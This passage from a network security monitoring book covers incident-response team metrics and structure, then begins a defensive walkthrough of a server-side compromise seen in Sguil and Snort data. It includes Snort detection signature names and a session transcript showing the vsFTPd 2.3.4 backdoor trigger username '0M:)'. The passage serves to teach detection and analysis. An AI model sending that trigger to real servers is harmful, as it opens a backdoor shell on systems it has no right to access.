<p class="calibre1">How fast should you remediate? Some CIRTs strive to limit the time </p>
<p class="calibre1">from  <i class="calibre4">detection to containment </i> to one hour or less. Others are more aggressive (and ambitious) and strive to limit the time from  <i class="calibre4">adversary access to remediation</i> to one hour or less. The choice depends on the risk tolerance of your </p>
<p class="calibre1">organization and the capabilities of the CIRT, IT teams, and constituents. </p>
<p class="calibre1">Once you start tracking times from detection to containment, you may find </p>
<p class="calibre1">that containment takes weeks, not an hour. Record these metrics and try to </p>
<p class="calibre1">drive down the time as you continue to develop your process and tactics. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Using NSM to Improve Security</b></i></p>
<p class="calibre1">At this point, we have a framework to think about CIRT and security improve-</p>
<p class="calibre1">ment. Let’s look at a few examples of how it could work in practice. </p>
<p class="calibre1">•  A vendor proposes adding a probe to collect and interpret NetFlow </p>
<p class="calibre1">records (a type of session data) from border routers. This activity </p>
<p class="calibre1">belongs in the collection phase of the NSM process. Because the CIRT </p>
<p class="calibre1">already gathers session data using Argus and Bro on SO sensors that </p>
<p class="calibre1">are watching gateways, additional collection may not be necessary. The </p>
<p class="calibre1">CIRT rejects the offer to buy NetFlow processing equipment. </p>
<p class="calibre1">•  Mandiant releases its report on APT1 ( <i class="calibre4">http://www.mandiant.com/apt1/</i>). </p>
<p class="calibre1">The archive includes more than 3,000 indicators. The CIRT realizes it </p>
<p class="calibre1">can use the indicators for IOC-centric matching activities, part of the </p>
<p class="calibre1">analysis phase in the NSM process. Mandiant also releases over 100 pages </p>
<p class="calibre1">describing tools used by APT1 actors. The CIRT uses that information </p>
<p class="calibre1">for IOC-free hunting analysis. </p>
<p class="calibre1">•  The time elapsed from incident detection to containment at a particu-</p>
<p class="calibre1">lar company is on the order of weeks, and the CIO wants to decrease </p>
<p class="calibre1">this to under one hour. A vendor proposes a new asset management </p>
<p class="calibre1">system. Multiple business lines express enthusiasm for the new tool </p>
<p class="calibre1">and form a working group to better manage asset inventory. The CIRT </p>
<p class="calibre1">endorses this new system because it will decrease the time needed to </p>
<p class="calibre1">identify asset owners and will improve the accuracy of incident notifica-</p>
<p class="calibre1">tion during the escalation phase of the NSM process. </p>
<p class="calibre1">•  The networking team decides to try implementing a network access </p>
<p class="calibre1">control (NAC) solution. The IT team members resist the program </p>
<p class="calibre1">because they fear it will impede user productivity, but the CIRT thinks </p>
<p class="calibre1">that this solution could be helpful during the resolution phase of the </p>
<p class="calibre1">NSM process. The CIRT convinces the IT team to support the NAC </p>
<p class="calibre1">solution. </p>
<p class="calibre1"><b class="calibre3">202</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p237"/>These examples demonstrate how working within the NSM process </p>
<p class="calibre1">can help CIRTs make better decisions regarding their operations. Rather </p>
<p class="calibre1">than being led by the newest security fad or vendor tool, CIRTs can identify </p>
<p class="calibre1">deficiencies in and improve all phases of their NSM process. By addressing </p>
<p class="calibre1">existing gaps, the CIRT can reduce detection and response time and help </p>
<p class="calibre1">identify problems in systems that are leading to compromise. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Building a CIRT</b></i></p>
<p class="calibre1">This book is primarily for those practicing NSM as individuals or as mem-</p>
<p class="calibre1">bers of CIRTs. Those of you working as lone contributors may wish your </p>
<p class="calibre1">constituent to expand the resources for handling NSM duties. To help jus-</p>
<p class="calibre1">tify additions, track these key metrics:</p>
<p class="calibre1">•  The classification and count of incidents</p>
<p class="calibre1">•  The time elapsed from incident detection to containment</p>
<p class="calibre1">Take these metrics to management staff members and ask if they are </p>
<p class="calibre1">satisfied with their numbers. Are they happy with the type and number of </p>
<p class="calibre1">incidents per quarter and year? Are they content with the amount of time it </p>
<p class="calibre1">takes to progress from incident detection to containment? If the answer is </p>
<p class="calibre1">no, estimate the cost of adding manpower, new tools, and better processes. </p>
<p class="calibre1">That’s your justification for adding new CIRT capabilities, or even creat-</p>
<p class="calibre1">ing the organization’s first CIRT. (For more reasons to build a CIRT and </p>
<p class="calibre1">related counter-threat operations, see my article “Become a Hunter” in the </p>
<p class="calibre1">July–August 2011 issue of  <i class="calibre4">Information Security Magazine</i> at <a href="http://taosecurity.blogspot.com/2011/12/become-hunter.html"> <i class="calibre4">http://taosecurity </i></a></p>
<p class="calibre1"><a href="http://taosecurity.blogspot.com/2011/12/become-hunter.html"> <i class="calibre4">.blogspot.com/2011/12/become-hunter.html</i>. </a>) Once you’ve been given the approval to add CIRT capacity, the next decision is how to build a team. I recommend </p>
<p class="calibre1">the general functions shown in Figure 9-7. </p>
<p class="calibre1">Director of Incident Response</p>
<p class="calibre1">Incident Detection and</p>
<p class="calibre1">Applied Threat</p>
<p class="calibre1">Infrastructure and</p>
<p class="calibre1">Response</p>
<p class="calibre1">Intelligence</p>
<p class="calibre1">Development</p>
<p class="calibre1">Incident Handlers</p>
<p class="calibre1">Principal Analysts</p>
<p class="calibre1">Architects</p>
<p class="calibre1">Incident Analysts</p>
<p class="calibre1">Senior Analysts</p>
<p class="calibre1">Engineers</p>
<p class="calibre1">Event Analysts</p>
<p class="calibre1">Associate Analysts</p>
<p class="calibre1">Administrators</p>
<p class="calibre1">Constituent Relations Team</p>
<p class="calibre1"> <i class="calibre4">Figure 9-7: General CIRT structure</i></p>
<p class="calibre1">NSM Operations   <b class="calibre3">203</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p238"/>The CIRT structure includes the following:</p>
<p class="calibre1"><b class="calibre3">Director of Incident Response</b></p>
<p class="calibre1">The director organizes, trains, and equips the CIRT to succeed. The </p>
<p class="calibre1">director selects a deputy from one of the three CIRT components to </p>
<p class="calibre1">assist with this mission, and keeps management away from the CIRT </p>
<p class="calibre1">so the CIRT can do its job. </p>
<p class="calibre1"><b class="calibre3">Incident Detection and Response (IDR) Center</b></p>
<p class="calibre1">This group is responsible for the daily analysis and escalation of secu-</p>
<p class="calibre1">rity incidents. The IDR Center consists of incident handlers (IHs, expe-</p>
<p class="calibre1">rienced analysts tasked with hunting), incident analysts (IAs, mid-level </p>
<p class="calibre1">analysts who combine hunting with matching), and event analysts (EAs, </p>
<p class="calibre1">beginning analysts who focus on matching). Analysts at all levels have </p>
<p class="calibre1">access to all datatypes, but EAs and IAs may classify only events for which </p>
<p class="calibre1">they are responsible. IHs train IAs and EAs, take them on digital hunt-</p>
<p class="calibre1">ing trips, and operationalize lessons into the repeatable playbooks EAs </p>
<p class="calibre1">use to identify intrusions. IHs open, manage, and close waves, depend-</p>
<p class="calibre1">ing on IAs and EAs for support. If possible, the IDR Center works a </p>
<p class="calibre1">24×7 schedule, with at least EAs on 24×7 duty and IHs and IAs on call. </p>
<p class="calibre1"><b class="calibre3">Applied Threat Intelligence (ATI) Center</b></p>
<p class="calibre1">This group is responsible for digital intelligence activities, internal </p>
<p class="calibre1">security consulting, adversary simulation, red teaming, and penetration </p>
<p class="calibre1">testing. It includes the following teams:</p>
<p class="calibre1">•  An  <i class="calibre4">Intelligence Team</i> provides reporting support during waves and </p>
<p class="calibre1">regular briefings and updates on adversary activity to the CIRT and </p>
<p class="calibre1">constituents. The team members also search evidence for indicators </p>
<p class="calibre1">of compromise and analyze it to extract adversary tools, techniques, </p>
<p class="calibre1">and procedures. </p>
<p class="calibre1">•  The  <i class="calibre4">Red Team</i> proactively assesses and tests the organization to </p>
<p class="calibre1">determine its security posture by simulating a wide variety of </p>
<p class="calibre1">threats. This team provides a metric against which CIRT perfor-</p>
<p class="calibre1">mance can be measured. </p>
<p class="calibre1">•  The  <i class="calibre4">Blue Team</i> members act as internal security consultants. They </p>
<p class="calibre1">help the organization improve the security of their assets. </p>
<p class="calibre1"><b class="calibre3">Infrastructure and Development (ID) Center</b></p>
<p class="calibre1">This group enables the other two CIRT components by employing soft-</p>
<p class="calibre1">ware developers who code production-grade tools. It designs, builds, </p>
<p class="calibre1">deploys, and runs the collection, analysis, and escalation tools. It also </p>
<p class="calibre1">leads development of new detection and response techniques. While </p>
<p class="calibre1">the other teams may develop proof-of-concept tools to support their </p>
<p class="calibre1">missions, the ID Team eventually assumes responsibility for those tools. </p>
<p class="calibre1"><b class="calibre3">204</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p239"/><b class="calibre3">Constituent Relations Team</b></p>
<p class="calibre1">This group acts as an intermediary between the CIRT and its constitu-</p>
<p class="calibre1">ents. These team members help keep things running smoothly between </p>
<p class="calibre1">CIRT and constituents, and they represent the CIRT outside the com-</p>
<p class="calibre1">pany itself. </p>
<p class="calibre1"><b class="calibre3">conclusion</b></p>
<p class="calibre1">This chapter explained the enterprise security cycle consisting of planning, </p>
<p class="calibre1">resistance, detection, and response phases. Many organizations pour all </p>
<p class="calibre1">of their effort into planning and resistance, but invest next to nothing for </p>
<p class="calibre1">detection and response. </p>
<p class="calibre1">In recent years, as persistent intruders have sliced through routine </p>
<p class="calibre1">defenses, organizations have begun to realize the value of detection and </p>
<p class="calibre1">response. If adversaries lose access to an organization before they can accom-</p>
<p class="calibre1">plish their mission, then they lose. The CIRT wins every time it defeats an </p>
<p class="calibre1">adversary before he can steal, alter, or deny access to business information. </p>
<p class="calibre1">The NSM process of collection, analysis, escalation, and resolution is </p>
<p class="calibre1">a powerful framework that can empower CIRTs and frustrate adversaries. </p>
<p class="calibre1">In order to be successful, CIRTs must classify and count all incidents they </p>
<p class="calibre1">detect, as well as measure the time from incident detection to containment. </p>
<p class="calibre1">They should develop time-sensitive processes for managing incidents, and </p>
<p class="calibre1">structure themselves to offer a mix of detection, intelligence, and support </p>
<p class="calibre1">functions. </p>
<p class="calibre1">With this understanding in place, we now turn to a couple of case stud-</p>
<p class="calibre1">ies showing NSM operations in action. </p>
<p class="calibre1">NSM Operations   <b class="calibre3">205</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p240"/><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p241"/><b class="calibre3">10</b></p>
<p class="calibre1"><b class="calibre3">S e r v e r- S i D e   c o M P r o M i S e</b></p>
<p class="calibre1">This is the moment of truth. Now you are </p>
<p class="calibre1">ready to see NSM in action. In this chapter, </p>
<p class="calibre1">we’ll put the theory, tools, and process to </p>
<p class="calibre1">work in a simple compromise scenario. So far, </p>
<p class="calibre1">you’ve implemented a sensor using SO and collected </p>
<p class="calibre1">some NSM data. Now you plan to analyze the avail-</p>
<p class="calibre1">able evidence. </p>
<p class="calibre1">This chapter demonstrates a server-side compromise—one of the major </p>
<p class="calibre1">categories of malicious network activity you’re likely to encounter. The next </p>
<p class="calibre1">chapter demonstrates a client-side compromise, which may be even more </p>
<p class="calibre1">popular than the server-side variant. We begin with a server-side compro-</p>
<p class="calibre1">mise because it is conceptually easier to understand. </p>
<p class="calibre1">Because this is a book about NSM, in this chapter and Chapter 11 we’ll </p>
<p class="calibre1">look at intrusion patterns for two popular network-centric attack types. </p>
<p class="calibre1">For example, I won’t discuss inserting a malicious USB drive into a laptop, </p>
<p class="calibre1">or password guessing by a rogue insider sitting at an internal computer </p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p242"/>terminal. Instead, we’ll focus on attacks across the network. These are <i class="calibre4">remote</i> attacks, rather than  <i class="calibre4">local</i> variants requiring interaction with a system that is physically or virtually already available to an intruder. </p>
<p class="calibre1"><b class="calibre3">Server-side compromise defined</b></p>
<p class="calibre1">A  <i class="calibre4">server-side compromise</i> involves an intruder deciding to attack an applica-</p>
<p class="calibre1">tion exposed to the Internet. The application could be a web service, a </p>
<p class="calibre1">file transfer protocol service, a database, or any other software listening to </p>
<p class="calibre1">Internet traffic. Figure 10-1 shows a generic attack pattern for a server-side </p>
<p class="calibre1">compromise. </p>
<p class="calibre1">1. Intruder initiates attack against exposed, </p>
<p class="calibre1">vulnerable application on victim system. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder</p>
<p class="calibre1">Victim</p>
<p class="calibre1">2. Attack method exploits vulnerable application </p>
<p class="calibre1">Exploited</p>
<p class="calibre1">on victim system to execute code or commands. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder</p>
<p class="calibre1">Victim</p>
<p class="calibre1">3. Malicious code interacts with intruder using one of three ways:</p>
<p class="calibre1">a. Intruder repurposes existing connection to victim application</p>
<p class="calibre1">OR</p>
<p class="calibre1">b. Intruder initiates new connection to backdoor created by </p>
<p class="calibre1">malicious code</p>
<p class="calibre1">OR</p>
<p class="calibre1">c. Malicious code causes victim to reach back to intruder</p>
<p class="calibre1"> <i class="calibre4">Figure 10-1: Server-side compromise at ack pat ern</i></p>
<p class="calibre1">The intruder will reach out to the application to learn more about </p>
<p class="calibre1">it. This act of reconnaissance qualifies as a Cat 6 incident, as discussed </p>
<p class="calibre1">in Chapter 9 (see Figure 9-5). If the intruder tries to take advantage of </p>
<p class="calibre1">any vulnerabilities in its code, that act qualifies as a Cat 3 incident. If the </p>
<p class="calibre1">intruder manages to get the application to do his evil bidding, the attack </p>
<p class="calibre1">is successful and  <i class="calibre4">exploitation</i> has occurred. According to the categories out-</p>
<p class="calibre1">lined in Figure 9-5, we now have a Cat 1 intrusion on our hands. After the </p>
<p class="calibre1">intruder executes malicious code or commands on the victim computer, he </p>
<p class="calibre1">opens one or more channels to further enhance his control of the system. </p>
<p class="calibre1">This is called a  <i class="calibre4">command-and-control (C2)</i> channel. Establishing a C2 channel </p>
<p class="calibre1">qualifies the activity as a Breach 3 intrusion. </p>
<p class="calibre1">Once the intruder establishes C2 with the victim, he can execute the </p>
<p class="calibre1">rest of his game plan. Perhaps he wants to steal information from this first </p>
<p class="calibre1">victim. Perhaps he wants to pivot from the first victim to another computer </p>
<p class="calibre1"><b class="calibre3">208</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p243"/>or application inside the company. Maybe he wants to bounce through this victim and attack an entirely different organization, using the newly compromised victim as a  <i class="calibre4">hop, </i> or jumping-off point. </p>
<p class="calibre1">Regardless of what the attacker chooses to do next, the goals of the </p>
<p class="calibre1">CIRT at this point are to quickly scope the extent of the intrusion and to </p>
<p class="calibre1">take rapid containment actions to mitigate risk of data loss, alteration, and </p>
<p class="calibre1">degradation. </p>
<p class="calibre1"><b class="calibre3">Server-side compromise in action</b></p>
<p class="calibre1">For this chapter’s example, we’ll walk through a server-side compromise </p>
<p class="calibre1">that occurs when an intruder attacks an exposed service on a vulnerable </p>
<p class="calibre1">computer that is monitored by a stand-alone NSM platform running SO. </p>
<p class="calibre1">We’ll examine what a sample intrusion looks like in NSM data, and figure </p>
<p class="calibre1">out how to make sense of that data. </p>
<p class="calibre1">The target network is a new segment on the Vivian’s Pets network, as </p>
<p class="calibre1">shown in Figure 10-2. The network consists of a server (192.168.3.5), a desk-</p>
<p class="calibre1">top (192.168.3.13), and supporting network equipment. An NSM sensor </p>
<p class="calibre1">watches the uplink to the Internet through a network tap. The company </p>
<p class="calibre1">CIRT members created what they believed was an isolated test network </p>
<p class="calibre1">with a few computers in order to learn more about security. Unfortunately, </p>
<p class="calibre1">they failed to effectively protect the systems on this segment. In the process </p>
<p class="calibre1">of trying to learn more about computer security, they may have exposed the </p>
<p class="calibre1">company to additional risk. </p>
<p class="calibre1">Internet</p>
<p class="calibre1">NSM</p>
<p class="calibre1">Test</p>
<p class="calibre1">Network</p>
<p class="calibre1">Tap</p>
<p class="calibre1">Server</p>
<p class="calibre1">192.168.3.5</p>
<p class="calibre1">Desktop</p>
<p class="calibre1">192.168.3.13</p>
<p class="calibre1"> <i class="calibre4">Figure 10-2: Test network on Vivian’s Pets network</i></p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">209</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p244"/><img src="index-244_1.png" alt="Image 124" class="calibre2"/></p>
<p class="calibre1">In this configuration, the NSM platform will see traffic to and from the </p>
<p class="calibre1">test network. For simplicity, I’ve configured the network so that NAT is not </p>
<p class="calibre1">required, and when you see the test network interacting with computers out-</p>
<p class="calibre1">side the Vivian’s Pets network, you should assume that no translation takes </p>
<p class="calibre1">place. (In the real world, you would likely need to deal with some degree of </p>
<p class="calibre1">obfuscation due to NAT issues, as described in Chapter 2.)</p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Starting with Sguil</b></i></p>
<p class="calibre1">The work of the Vivian’s Pets CIRT begins with a visit to its Sguil console, </p>
<p class="calibre1">which the team uses as its primary interface to NSM data. Recall that Sguil </p>
<p class="calibre1">allows analysts to investigate alerts by viewing session and full content data, </p>
<p class="calibre1">as well as some transaction data. </p>
<p class="calibre1">One day, an analyst logs in to the Sguil console for the NSM platform </p>
<p class="calibre1">shown in Figure 10-2 and sees the alerts shown in Figure 10-3. </p>
<p class="calibre1"> <i class="calibre4">Figure 10-3: Sguil console for Vivian’s Pets</i></p>
<p class="calibre1">The default Sguil console displays alert data. The alerts shown here </p>
<p class="calibre1">are generated primarily by the PRADS passive asset detection system </p>
<p class="calibre1">(with entries prefaced by PADS) and by the Snort IDS engine (with entries </p>
<p class="calibre1">prefaced by GPL or ET). </p>
<p class="calibre1">We see a slew of PRADS events with source IP address 203.0.113.10. </p>
<p class="calibre1">This IP address represents a remote intruder. (The 203.0.113.0/24 net </p>
<p class="calibre1">block is reserved for documentation purposes per RFC 5735, along with </p>
<p class="calibre1">the 198.51.100.0/24 net block we saw in Chapter 2.) </p>
<p class="calibre1"><b class="calibre3">210</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p245"/><img src="index-245_1.png" alt="Image 125" class="calibre2"/></p>
<p class="calibre1">The events starting with Alert ID 4.75 and ending with 4.87 represent </p>
<p class="calibre1">PRADS reporting the discovery of new services on two computers: 192.168.3.5 </p>
<p class="calibre1">and 192.168.3.13, the two systems in the test network segment shown in </p>
<p class="calibre1">Figure 10-2. As PRADS learns about services by watching computers interact </p>
<p class="calibre1">with them, it generates these sorts of alerts. Here, the result is a handy sum-</p>
<p class="calibre1">mary of at least some of the services that the remote intruder at 203.0.113.10 </p>
<p class="calibre1">appears to have discovered. Starting at 2013-03-09 21:32:07, the timestamp </p>
<p class="calibre1">on the first alert with 203.0.113.10 as the source IP address, we see that </p>
<p class="calibre1">203.0.113.10 conducted network reconnaissance against at least two com-</p>
<p class="calibre1">puters in the test network. </p>
<p class="calibre1">What about the other activity? The first alert, with source IP address </p>
<p class="calibre1">192.168.3.130, appears to be PRADS reporting the discovery of a DNS server </p>
<p class="calibre1">on 192.168.3.1. That is not unusual. The alerts after the PRADS events from </p>
<p class="calibre1">203.0.113.10 appear to be more worrying. </p>
<p class="calibre1">Before digging into these alerts, let’s take a slight detour to validate our </p>
<p class="calibre1">hypothesis that 203.0.113.10 conducted network reconnaissance against this </p>
<p class="calibre1">test network. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Querying Sguil for Session Data</b></i></p>
<p class="calibre1">To determine just what network reconnaissance 203.0.113.10 performed, </p>
<p class="calibre1">we can query Sguil for session data to or from 203.0.113.10. Because of the </p>
<p class="calibre1">number of target services in the Sguil console, we can guess that 203.0.113.10 </p>
<p class="calibre1">scanned many TCP ports on the two target computers. Therefore, when we </p>
<p class="calibre1">query for session data in Sguil, we’ll manually adjust the session limit count </p>
<p class="calibre1">upward from 1000 results to 10,000 results. </p>
<p class="calibre1">To perform the session data query, we highlight one of the alert records </p>
<p class="calibre1">showing 203.0.113.10 as the source IP address, and then select <b class="calibre3">Advanced </b></p>
<p class="calibre1"><b class="calibre3">Query</b>4<b class="calibre3">Query Sancp Table</b>4<b class="calibre3">Query SrcIP</b>, as shown in Figure 10-4. </p>
<p class="calibre1"> <i class="calibre4">Figure 10-4: Querying for session data using the source IP address</i></p>
<p class="calibre1">The resulting Query Builder window offers two Where Clause boxes for </p>
<p class="calibre1">us to edit. We need to make sure that the default start times for the session </p>
<p class="calibre1">records will capture the data we care about. In this case, the activity began </p>
<p class="calibre1">on March 9, 2013, at 21:32:07 UTC, so we modify the Where Clause boxes </p>
<p class="calibre1">to search for the proper time, as shown in Listing 10-1. </p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">211</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p246"/><img src="index-246_1.png" alt="Image 126" class="calibre2"/></p>
<p class="calibre1">WHERE sancp.start_time &gt; '2013-03-09' AND  sancp.src_ip = INET_ATON('203.0.113.10') <i class="calibre4">Listing 10-1: Search syntax for session data involving 203.0.113.10</i></p>
<p class="calibre1">After also adjusting the LIMIT field in the Query Builder window from </p>
<p class="calibre1">1000 to 10,000 results, we choose <b class="calibre3">Submit</b> to run the query. The answer from </p>
<p class="calibre1">the Sguil database produces 2104 records, beginning with those shown in </p>
<p class="calibre1">Figure 10-5. </p>
<p class="calibre1"> <i class="calibre4">Figure 10-5: Session data to or from 203.0.113.10 showing reconnaissance phases 1 and 2, and the beginning of phase 3</i></p>
<p class="calibre1">The activity from 203.0.113.10 begins at 2013-03-09 21:31:44. We can </p>
<p class="calibre1">break the sequence of events into several distinct elements. </p>
<p class="calibre1">•  First, the attacker uses ICMP (IP Protocol 1) to perform reconnaissance </p>
<p class="calibre1">against a subset of systems on the 192.168.3.0/24 network. We can’t be </p>
<p class="calibre1">sure, but perhaps the intruder did earlier reconnaissance (not recorded </p>
<p class="calibre1">here) that led him to try to ping only these six systems. The ICMP scan </p>
<p class="calibre1">is phase 1. He begins phase 2 at 2013-03-09 21:31:45, consisting of scans </p>
<p class="calibre1">against ports 80 and 443 TCP on several systems. </p>
<p class="calibre1"><b class="calibre3">212</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p247"/><img src="index-247_1.png" alt="Image 127" class="calibre2"/></p>
<p class="calibre1">•  Phase 3 begins at 2013-03-09 21:32:01 with scans against a wide variety </p>
<p class="calibre1">of TCP ports. In phase 4, also at the same timestamp, we see smaller </p>
<p class="calibre1">scans of what are likely open ports. (The activity is so fast that it appears </p>
<p class="calibre1">to all start in the same second of time.) </p>
<p class="calibre1">Figure 10-6 shows the end of phase 3 and the beginning of phase 4. </p>
<p class="calibre1"> <i class="calibre4">Figure 10-6: Reconnaissance phase 3 ends and phase 4 begins. </i></p>
<p class="calibre1">Figure 10-7 shows that phase 4 ends at 2013-03-09 21:32:06 with the </p>
<p class="calibre1">intruder changing tactics again. At 2013-03-09 21:32:07, he conducts addi-</p>
<p class="calibre1">tional reconnaissance, beginning phase 5—interrogating active services. </p>
<p class="calibre1">We see him sending and receiving higher amounts of data as shown in the </p>
<p class="calibre1">far-right columns in Figure 10-7. (Higher counts of data sent between two </p>
<p class="calibre1">computers typically signify a more “meaningful” conversation. Low counts </p>
<p class="calibre1">are usually just exchanges of state information for the TCP three-way hand-</p>
<p class="calibre1">shake, for example.)</p>
<p class="calibre1">The four right-most columns in Figures 10-5 through 10-8 show packets </p>
<p class="calibre1">and data sent by the source, and packets and data sent by the destination. </p>
<p class="calibre1">The intruder is likely profiling the target active services using a recon-</p>
<p class="calibre1">naissance tool to gather information about the services available. The </p>
<p class="calibre1">intruder compares information derived from the scan to find available </p>
<p class="calibre1">attack  methods, and if he finds one that takes advantage of an exposed </p>
<p class="calibre1">vulnerability, he will exploit that weakness. </p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">213</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p248"/><img src="index-248_1.png" alt="Image 128" class="calibre2"/></p>
<p class="calibre1"> <i class="calibre4">Figure 10-7: Reconnaissance phase 4 ends and phase 5 begins. </i></p>
<p class="calibre1">The final phase of the activity begins at 2013-03-09 21:38:38, as shown </p>
<p class="calibre1">in Figure 10-8. The intruder’s reconnaissance tool has finished gathering </p>
<p class="calibre1">information, and he pauses to review his results. After discovering a weak-</p>
<p class="calibre1">ness, he appears to exploit it, although that may not be obvious from the ses-</p>
<p class="calibre1">sion data shown. (We’ll examine this alert data on the original Sguil console </p>
<p class="calibre1">for clarification.) For now, review the session records starting at 21:38:38. </p>
<p class="calibre1">The sessions beginning at 21:38:38 look very different from the earlier </p>
<p class="calibre1">ones. One of the sessions shows the transfer of a lot of data, involving port 6200 </p>
<p class="calibre1">TCP. Another session (records showing activity involving port 21 TCP) shows </p>
<p class="calibre1">an active FTP command channel. Having seen five phases of reconnaissance </p>
<p class="calibre1">from 203.0.113.10, followed by focused activity involving ports 21 and 6200 </p>
<p class="calibre1">TCP, we should take a close look at these last connections. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Returning to Alert Data</b></i></p>
<p class="calibre1">Let’s examine two alerts in the Sguil console. As shown in Figure 10-9, we </p>
<p class="calibre1">see two worrisome alerts titled GPL ATTACK_RESPONSE id check returned root </p>
<p class="calibre1">and ET EXPLOIT VSFTPD Backdoor User Login Smiley. There is also an odd alert </p>
<p class="calibre1">with the title PADS New Asset - sql MySQL 3.0.20-0.1ubuntu1, and then two </p>
<p class="calibre1">ICMP alerts. </p>
<p class="calibre1"><b class="calibre3">214</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p249"/><img src="index-249_1.png" alt="Image 129" class="calibre2"/></p>
<p class="calibre1"><img src="index-249_2.png" alt="Image 130" class="calibre2"/></p>
<p class="calibre1"> <i class="calibre4">Figure 10-8: Reconnaissance phase 5 ends, and the intruder at acks a victim. </i></p>
<p class="calibre1"> <i class="calibre4">Figure 10-9: Snort alert data fol owing reconnaissance alerts</i></p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">215</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p250"/>I’ve highlighted the record for the ET EXPLOIT alert because it appears to be the most straightforward one, and it uses a fairly familiar protocol: FTP. </p>
<p class="calibre1">Sguil’s Show Packet Data option reveals that the username supplied to the </p>
<p class="calibre1">FTP server is 0M:), followed by a carriage return (0D) and line feed (0A). (FTP </p>
<p class="calibre1">ends commands with these characters, meaning they were transmitted by </p>
<p class="calibre1">the FTP client when the user (or attack tool) entered the FTP username.)</p>
<p class="calibre1">We can try to generate a transcript for this event by right-clicking the </p>
<p class="calibre1">Alert ID field and selecting <b class="calibre3">Transcript</b>. The result is shown in Listing 10-2. </p>
<p class="calibre1">Sensor Name:    sovm-eth1-1</p>
<p class="calibre1">Timestamp:      2013-03-09 21:38:38</p>
<p class="calibre1">Connection ID:  .sovm-eth1-1_6011</p>
<p class="calibre1">Src IP:         203.0.113.10u    (Unknown)</p>
<p class="calibre1">Dst IP:         192.168.3.5x     (Unknown)</p>
<p class="calibre1">Src Port:               50376</p>
<p class="calibre1">Dst Port:               21w</p>
<p class="calibre1">OS Fingerprint: 203.0.113.10:50376 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?] (up: 1 hrs) OS Fingerprint:   -&gt; 192.168.3.5:21 (link: ethernet/modem)</p>
<p class="calibre1">DST: 220 (vsFTPd 2.3.4)v</p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: USER 0M:)y</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 331 Please specify the password. </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: PASS azzz</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">DST: 421 Timeout.{</p>
<p class="calibre1">DST:</p>
<p class="calibre1"> <i class="calibre4">Listing 10-2: Transcript of ET EXPLOIT Alert</i></p>
<p class="calibre1">This transcript shows 203.0.113.10 u logging in to the FTP server v on </p>
<p class="calibre1">port 21 TCP w on 192.168.3.5 x. The username is 0M:) y, as noted earlier </p>
<p class="calibre1">by the Snort alert. The client provides a password of azz z, but no commu-</p>
<p class="calibre1">nication takes place {. What happened next, and what about the connection </p>
<p class="calibre1">involving port 6200 TCP? </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Reviewing Full Content Data with Tshark</b></i></p>
<p class="calibre1">In situations like this, I recommend examining the original traffic as </p>
<p class="calibre1">recorded by the full content data. We’re interested in traffic occurring at </p>
<p class="calibre1">the 2013-03-09 21:38:38 timestamp involving port 21 or 6200 TCP. We can </p>
<p class="calibre1">read the full content data by looking in the appropriate directory on the </p>
<p class="calibre1">sensor named sovm and by watching the eth1 interface. We run the ls com-</p>
<p class="calibre1">mand to see the name of the full content file available for review, as shown </p>
<p class="calibre1">in Listing 10-3. </p>
<p class="calibre1"><b class="calibre3">216</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p251"/>$ <b class="calibre3">cd /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-09</b></p>
<p class="calibre1">$ <b class="calibre3">ls</b></p>
<p class="calibre1">snort.log.1362864654</p>
<p class="calibre1">$ <b class="calibre3">tshark -n -t ad -r snort.log.1362864654 tcp.port==21 or tcp.port==6200</b></p>
<p class="calibre1"> <i class="calibre4">Listing 10-3: Finding the full content data and running Tshark</i></p>
<p class="calibre1">We use Tshark because, by default, it displays more protocol-level details, </p>
<p class="calibre1">making it easier to follow what’s happening. Now we’ll look at each relevant </p>
